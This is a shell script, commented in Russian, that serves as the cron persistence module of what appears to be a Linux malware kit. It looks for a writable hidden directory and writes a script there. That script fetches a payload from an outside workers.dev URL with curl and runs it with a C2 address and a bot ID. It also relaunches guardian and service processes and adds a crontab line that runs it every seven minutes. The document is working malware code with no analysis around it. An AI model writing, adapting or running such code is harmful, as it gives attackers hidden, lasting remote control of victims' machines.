#!/bin/sh
# cron_persist.sh — cron-носитель. Их схема: /etc/.dd/cron-fetch.sh + строка в crontab,
# fallback $HOME/.usr_cron/lib, /var/tmp/.dd. Без cron остаётся только channel-persistence.
# Запуск: sh cron_persist.sh
D=/var/tmp/.kf
URL="${KF_FETCH:-https://edge-static.cdn-edge-e9d.workers.dev/agent.sh}"
MARK="${KF_MARK:-kf9}"

log() { [ -n "${KF_QUIET:-}" ] || echo "[cron] $*"; }
[ -f "$D/00-common.sh" ] && { . "$D/00-common.sh"; kf_cron_log "cron-полоса: старт"; }

DIR=""
for d in /etc/.dd "$HOME/.usr_cron/lib" /var/tmp/.dd; do
  mkdir -p "$d" 2>/dev/null || continue
  [ -w "$d" ] && { DIR="$d"; break; }
done
[ -n "$DIR" ] || { log "нет записываемого каталога — cron невозможен"; exit 1; }

SELF="$DIR/cron-fetch.sh"
cat > "$SELF" <<EOS
#!/bin/sh
# $MARK
C2=\$(cat '$D/c2list' 2>/dev/null | cut -d' ' -f1); ID=\$(cat '$D/id' 2>/dev/null)
curl -fsSL -m 60 '$URL' -o /tmp/.cf.b 2>/dev/null && {
  if sh -n /tmp/.cf.b 2>/dev/null; then
    sh /tmp/.cf.b "\$C2" "\$ID" >/dev/null 2>&1 &
  elif [ -f '$D/70-fetch.sh' ]; then
    . '$D/70-fetch.sh'; kf_run_gated < /tmp/.cf.b >/dev/null 2>&1 &
  fi
}
for p in /proc/[0-9]*; do
  c=\$(tr '\0' ' ' 2>/dev/null <"\$p/cmdline")
  case "\$c" in *guardian.sh*) exit 0 ;; esac
done
[ -s '$D/c.json' ] || exit 0
setsid sh '$D/guardian.sh' >/dev/null 2>&1 &
setsid sh '$D/svc.sh' m >/dev/null 2>&1 &
EOS
chmod 700 "$SELF"

LINE="*/7 * * * * $SELF >/dev/null 2>&1"
if command -v crontab >/dev/null 2>&1; then
  if crontab -l 2>/dev/null | grep -q "$SELF"; then
    log "crontab уже содержит строку"
  elif { crontab -l 2>/dev/null; echo "$LINE"; } | crontab - 2>/dev/null; then
    log "crontab установлен: $SELF"
  else
    log "crontab не принял строку, файл оставлен: $SELF"
  fi
else
  log "cron недоступен — channel-only persistence, файл: $SELF"
fi
